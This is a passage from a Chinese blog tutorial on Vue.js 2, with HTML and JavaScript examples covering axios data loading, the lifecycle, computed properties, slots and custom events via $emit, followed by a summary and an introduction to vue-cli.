class="string">"en"</span> <span class="attr">xmlns:v-bind</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    1.导入vue--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/axios/dist/axios.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    v-cloak:解决闪烁问题--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-attr">[v-cloak]</span>&#123;</span></span><br><span class="line">            display: none;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"vue"</span> <span class="attr">v-cloak</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> &gt;</span>&#123;&#123;info.name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#vue"</span>,</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//data: 属性 vm</span></span></span><br><span class="line">        data:&#123;info:&#123;&#125;&#125;,</span><br><span class="line"><span class="actionscript">        mounted()&#123; <span class="comment">//钩子函数  链式编程  ES6的新特性</span></span></span><br><span class="line"><span class="javascript">            axios.get(<span class="string">'data.json'</span>).then(<span class="function"><span class="params">response</span>=&gt;</span>(<span class="keyword">this</span>.info=response.data));</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>说明：</p>
<ol>
<li><p>在这里使用了v-bind将a:href的属性值与Vue实例中的数据进行绑定</p>
</li>
<li><p>使用axios框架的get方法请求AJAX并自动将数据封装进了Vue实例的数据对象中</p>
</li>
<li><p>我们在data中的数据结构必须和<code>Ajax</code>响应回来的数据格式匹配！</p>
</li>
</ol>
<h3 id="Vue生命周期"><a href="#Vue生命周期" class="headerlink" title="Vue生命周期"></a>Vue生命周期</h3><p>官方文档：<a href="https://cn.vuejs.org/v2/guide/instance.html#生命周期图示" target="_blank" rel="noopener">https://cn.vuejs.org/v2/guide/instance.html#生命周期图示</a></p>
<p>Vue实例有一个完整的生命周期，也就是从开始创建初女台化数据、编译模板、挂载DOM、渲染一更新一渲染、卸载等一系列过程，我们称这是Vue的生命周期。通俗说就是Vue实例从创建到销毁的过程，就是生命周期。</p>
<p>在Vue的整个生命周期中，它提供了一系列的事件，可以让我们在事件触发时注册JS方法，可以让我们用自己注册的JS方法控制整个大局，在这些事件响应方法中的this直接指向的是Vue的实例。</p>
<h2 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h2><h3 id="什么是计算属性"><a href="#什么是计算属性" class="headerlink" title="什么是计算属性"></a>什么是计算属性</h3><p>计算属性的重点突出在<code>属性</code>两个字上(属性是名词)，首先它是个<code>属性</code>其次这个属性有<code>计算</code>的能力(计算是动词)，这里的<code>计算</code>就是个函数：简单点说，它就是一个能够将计算结果缓存起来的属性(将行为转化成了静态的属性)，仅此而已；可以想象为缓存!</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:v-bind</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    1.导入vue--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/axios/dist/axios.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--view层 模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>currentTime1:&#123;&#123;currentTime1()&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>currentTime1:&#123;&#123;currentTime2&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            message:<span class="string">"hello,51nd0re1"</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="actionscript">            currentTime1:<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> <span class="built_in">Date</span>.now(); <span class="comment">//返回一个时间戳</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="actionscript">        computed:&#123; <span class="comment">//计算属性:methods和computed中的方法名最好不要重名  重名之后 methods的优先级会更高</span></span></span><br><span class="line"><span class="actionscript">            currentTime2:<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.message;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> <span class="built_in">Date</span>.now(); <span class="comment">//返回一个时间戳</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意：methods和computed里的东西不能重名</p>
<p>说明：</p>
<ul>
<li><p>methods：定义方法， 调用方法使用currentTime1()， 需要带括号</p>
</li>
<li><p>computed：定义计算属性， 调用属性使用currentTime2， 不需要带括号：this.message是为了能够让currentTime2观察到数据变化而变化</p>
</li>
<li><p>如何在方法中的值发生了变化，则缓存就会刷新!可以在控制台使用<code>vm.message=”q in jiang&quot;</code>， 改变下数据的值，再次测试观察效果!</p>
</li>
</ul>
<p><strong>结论：</strong><br>调用方法时，每次都需要讲行计算，既然有计算过程则必定产生系统开销，那如果这个结果是不经常变化的呢?此时就可以考虑将这个结果缓存起来，采用计算属性可以很方便的做到这点，<strong>计算属性的主要特性就是为了将不经常变化的计算结果进行缓存，以节约我们的系统开销；</strong></p>
<h2 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h2><p>在<code>Vue.js</code>中我们使用<code>&lt;slot&gt;</code>元素作为承载分发内容的出口，作者称其为插槽，可以应用在组合组件的场景中；</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>比如准备制作一个待办事项组件(todo) ， 该组件由待办标题(todo-title) 和待办内容(todo-items)组成，但这三个组件又是相互独立的，该如何操作呢?</p>
<p><strong>第一步定义一个待办事项的组件</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">todo</span>&gt;</span><span class="tag">&lt;/<span class="name">todo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--1.导入Vue.js--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.21/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    Vue.component(<span class="string">'todo'</span>,&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        template:'<span class="tag">&lt;<span class="name">div</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>代办事项<span class="tag">&lt;/<span class="name">div</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span>学习狂神说Java<span class="tag">&lt;/<span class="name">li</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>第二步 我们需要让，代办事项的标题和值实现动态绑定，怎么做呢？我们可以留一个插槽！</strong></p>
<p>1.将上面的代码留出一个插槽，即slot</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Vue.component('todo',&#123;</span><br><span class="line">       template:'<span class="tag">&lt;<span class="name">div</span>&gt;</span>\</span><br><span class="line">               <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">"todo-title"</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span>\</span><br><span class="line">               <span class="tag">&lt;<span class="name">ul</span>&gt;</span>\</span><br><span class="line">                   <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">"todo-items"</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span>\</span><br><span class="line">               <span class="tag">&lt;/<span class="name">ul</span>&gt;</span>\</span><br><span class="line">           <span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure>
<p>2.定义一个名为todo-title的待办标题组件 和 todo-items的待办内容组件</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Vue.component(<span class="string">'todo-title'</span>,&#123;</span><br><span class="line">        props:[<span class="string">'title'</span>],</span><br><span class="line">        template:<span class="string">'&lt;div&gt;&#123;&#123;title&#125;&#125;&lt;/div&gt;'</span></span><br><span class="line">    &#125;);</span><br><span class="line">   </span><br><span class="line"><span class="number">12345</span></span><br><span class="line"><span class="comment">//这里的index，就是数组的下标，使用for循环遍历的时候，可以循环出来！</span></span><br><span class="line">    Vue.component(<span class="string">"todo-items"</span>,&#123;</span><br><span class="line">        props:[<span class="string">"item"</span>,<span class="string">"index"</span>],</span><br><span class="line">        template:<span class="string">"&lt;li&gt;&#123;&#123;index+1&#125;&#125;,&#123;&#123;item&#125;&#125;&lt;/li&gt;"</span></span><br><span class="line">    &#125;);</span><br><span class="line"><span class="number">1234567891011</span></span><br></pre></td></tr></table></figure>
<p>3.实例化Vue并初始化数据</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">       el:<span class="string">"#vue"</span>,</span><br><span class="line">       data:&#123;</span><br><span class="line">           todoItems:[<span class="string">'test1'</span>,<span class="string">'test2'</span>,<span class="string">'test3'</span>]</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure>
<p>4.将这些值，通过插槽插入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"vue"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">todo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">todo-title</span> <span class="attr">slot</span>=<span class="string">"todo-title"</span> <span class="attr">title</span>=<span class="string">"秦老师系列课程"</span>&gt;</span><span class="tag">&lt;/<span class="name">todo-title</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;todo-items slot="todo-items" v-for="&#123;item,index&#125; in todoItems" v-bind:item="item"&gt;&lt;/todo-items&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--如下为简写--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">todo-items</span> <span class="attr">slot</span>=<span class="string">"todo-items"</span> <span class="attr">v-for</span>=<span class="string">"item in todoItems"</span> <span class="attr">:item</span>=<span class="string">"item"</span>&gt;</span><span class="tag">&lt;/<span class="name">todo-items</span></span></span><br><span class="line">    &lt;/todo&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>说明：我们的todo-title和todo-items组件分别被分发到了todo组件的todo-title和todo-items插槽中</p>
<p>完整代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:v-bind</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    1.导入vue--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/axios/dist/axios.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--view层 模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">todo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">todo-title</span> <span class="attr">slot</span>=<span class="string">"todo-title"</span> <span class="attr">:title</span>=<span class="string">"title"</span>&gt;</span><span class="tag">&lt;/<span class="name">todo-title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">todo-items</span> <span class="attr">slot</span>=<span class="string">"todo-items"</span> <span class="attr">v-for</span>=<span class="string">"items in todoItems"</span> <span class="attr">v-bind:item</span>=<span class="string">"items"</span>&gt;</span><span class="tag">&lt;/<span class="name">todo-items</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">todo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//slot:插槽</span></span></span><br><span class="line"><span class="actionscript">    Vue.component(<span class="string">"todo"</span>,&#123;</span></span><br><span class="line">        template:</span><br><span class="line"><span class="handlebars"><span class="xml">            '<span class="tag">&lt;<span class="name">div</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">"todo-title"</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">"todo-items"</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    Vue.component(<span class="string">"todo-title"</span>,&#123;</span></span><br><span class="line"><span class="actionscript">        props:[<span class="string">'title'</span>],</span></span><br><span class="line"><span class="handlebars"><span class="xml">        template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><span class="template-variable">&#123;&#123;title&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    Vue.component(<span class="string">"todo-items"</span>,&#123;</span></span><br><span class="line"><span class="actionscript">        props:[<span class="string">'item'</span>],</span></span><br><span class="line"><span class="handlebars"><span class="xml">        template: '<span class="tag">&lt;<span class="name">li</span>&gt;</span></span><span class="template-variable">&#123;&#123;item&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span>'</span></span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            title:<span class="string">"s1nd0re1"</span>,</span></span><br><span class="line"><span class="actionscript">            todoItems:[<span class="string">'Java'</span>,<span class="string">'前端'</span>,<span class="string">'Linux'</span>]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="自定义事件"><a href="#自定义事件" class="headerlink" title="自定义事件"></a>自定义事件</h2><p>讲道理这里给我整麻了<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span> <span class="attr">xmlns:v-bind</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    1.导入vue--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/axios/dist/axios.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--view层 模板--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">todo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">todo-title</span> <span class="attr">slot</span>=<span class="string">"todo-title"</span> <span class="attr">:title</span>=<span class="string">"title"</span>&gt;</span><span class="tag">&lt;/<span class="name">todo-title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">todo-items</span> <span class="attr">slot</span>=<span class="string">"todo-items"</span> <span class="attr">v-for</span>=<span class="string">"(item,index) in todoItems"</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">v-bind:item</span>=<span class="string">"item"</span> <span class="attr">:index</span>=<span class="string">"index"</span> <span class="attr">v-on:remove</span>=<span class="string">"removeItems(index)"</span>&gt;</span><span class="tag">&lt;/<span class="name">todo-items</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">todo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//slot:插槽</span></span></span><br><span class="line"><span class="actionscript">    Vue.component(<span class="string">"todo"</span>,&#123;</span></span><br><span class="line">        template:</span><br><span class="line"><span class="handlebars"><span class="xml">            '<span class="tag">&lt;<span class="name">div</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">"todo-title"</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">"todo-items"</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span>\</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    Vue.component(<span class="string">"todo-title"</span>,&#123;</span></span><br><span class="line"><span class="actionscript">        props:[<span class="string">'title'</span>],</span></span><br><span class="line"><span class="handlebars"><span class="xml">        template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><span class="template-variable">&#123;&#123;title&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    Vue.component(<span class="string">"todo-items"</span>,&#123;</span></span><br><span class="line"><span class="actionscript">        props:[<span class="string">'item'</span>,<span class="string">'index'</span>],</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//只能绑定当前组件的方法</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        template: '<span class="tag">&lt;<span class="name">li</span>&gt;</span></span><span class="template-variable">&#123;&#123;index&#125;&#125;</span><span class="xml">-------</span><span class="template-variable">&#123;&#123;item&#125;&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"remove"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>',</span></span></span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="actionscript">            remove:<span class="function"><span class="keyword">function</span> <span class="params">(index)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">//</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.$emit(<span class="string">'remove'</span>,index);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">"#app"</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="actionscript">            title:<span class="string">"s1nd0re1"</span>,</span></span><br><span class="line"><span class="actionscript">            todoItems:[<span class="string">'Java'</span>,<span class="string">'前端'</span>,<span class="string">'Linux'</span>]</span></span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="actionscript">            removeItems:<span class="function"><span class="keyword">function</span> <span class="params">(index)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="keyword">this</span>.todoItems[index]+<span class="string">"删除成功"</span>)</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.todoItems.splice(index,<span class="number">1</span>);  <span class="comment">//一次删除一个元素</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/Vue/自定义事件.png" alt="avatar"></p>
<p>真正开发并不会这样写Vue  而是直接使用官方提供的脚手架进行开发</p>
<p><del>先劝退后开发</del></p>
<h2 id="Vue入门小结"><a href="#Vue入门小结" class="headerlink" title="Vue入门小结"></a>Vue入门小结</h2><p>核心：数据驱动，组件化</p>
<p>优点：借鉴了AngularJS的模块化开发和React的虚拟Dom，虚拟Dom就是把Demo操作放到内存中执行；</p>
<p>常用的属性：</p>
<ul>
<li>v-if</li>
<li>v-else-if</li>
<li>v-else</li>
<li>v-for</li>
<li>v-on绑定事件，简写<code>@</code></li>
<li>v-model数据双向绑定</li>
<li>v-bind给组件绑定参数，简写<code>:</code></li>
</ul>
<p>组件化：</p>
<ul>
<li>组合组件slot插槽</li>
<li>组件内部绑定事件需要使用到<code>this.$emit(&quot;事件名&quot;,参数);</code></li>
<li>计算属性的特色，缓存计算数据</li>
</ul>
<p>遵循SoC关注度分离原则，Vue是纯粹的视图框架，并不包含，比如Ajax之类的通信功能，为了解决通信问题，我们需要使用Axios框架做异步通信；</p>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>Vue的开发都是要基于NodeJS，实际开发采用Vue-cli脚手架开发，vue-router路由，vuex做状态管理；Vue UI，界面我们一般使用ElementUI（饿了么出品），或者ICE（阿里巴巴出品）来快速搭建前端项目~~</p>
<p>官网：</p>
<ul>
<li><a href="https://element.eleme.cn/#/zh-CN" target="_blank" rel="noopener">https://element.eleme.cn/#/zh-CN</a></li>
<li><a href="https://ice.work/" target="_blank" rel="noopener">https://ice.work/</a></li>
</ul>
<h2 id="Vue-cli"><a href="#Vue-cli" class="headerlink" title="Vue-cli"></a>Vue-cli</h2><p><del>开始小学一年级</del></p>
<p>vue-cli官方提供的一个脚手架，用于快速生成一个vue的项目模板；</p>
